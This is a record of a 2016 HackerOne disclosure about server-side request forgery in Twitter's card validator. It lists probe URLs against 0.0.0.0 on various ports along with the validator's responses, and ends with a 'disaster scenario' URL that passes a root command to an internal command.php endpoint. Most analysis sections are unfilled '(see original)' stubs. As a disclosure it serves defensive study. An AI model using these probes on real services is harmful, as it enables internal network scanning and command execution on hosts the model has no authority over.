# SSRF in https://cards-dev.twitter.com/validator

## Metadata
- **Source:** HackerOne
- **Report:** 178184 | https://hackerone.com/reports/178184
- **Submitted:** 2016-10-26
- **Reporter:** mindaugas
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Server-Side Request Forgery (SSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hello, 

After my previous report (2 years ago)  https://hackerone.com/reports/30860 you fixed the vulnerability, but now it looks like this fix was reverted and the same problem exists again.

Test scenario:
Open https://cards-dev.twitter.com/validator

1. Closed port on localhost
http://0.0.0.0:123 -> ERROR: Fetching the page failed because other errors.

2. Open port but not HTPP
http://0.0.0.0

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello, 

After my previous report (2 years ago)  https://hackerone.com/reports/30860 you fixed the vulnerability, but now it looks like this fix was reverted and the same problem exists again.

Test scenario:
Open https://cards-dev.twitter.com/validator

1. Closed port on localhost
http://0.0.0.0:123 -> ERROR: Fetching the page failed because other errors.

2. Open port but not HTPP
http://0.0.0.0:22 -> ERROR: Failed to fetch page due to: ChannelClosed

3. Open HTPP port
http://0.0.0.0:4680
->
INFO:  Page fetched successfully
INFO:  2 metatags were found
WARN:  Not whitelisted

4. Existing folder
http://0.0.0.0:4680/system/
 ->
INFO:  Page fetched successfully
INFO:  2 metatags were found
WARN:  Not whitelisted

5. None existis folder
http://0.0.0.0:4680/system/
->
http://0.0.0.0:4680/test/
INFO:  Page fetched successfully
WARN:  No metatags found

Disaster scenario:
Find open HTTP service running on local infrastructure with ability to execute commands.

For example:
http://0.0.0.0:4680/system/command.php?command=[ROOT_COMMAND]



</details>

---
*Analysed by Claude on 2026-05-24*
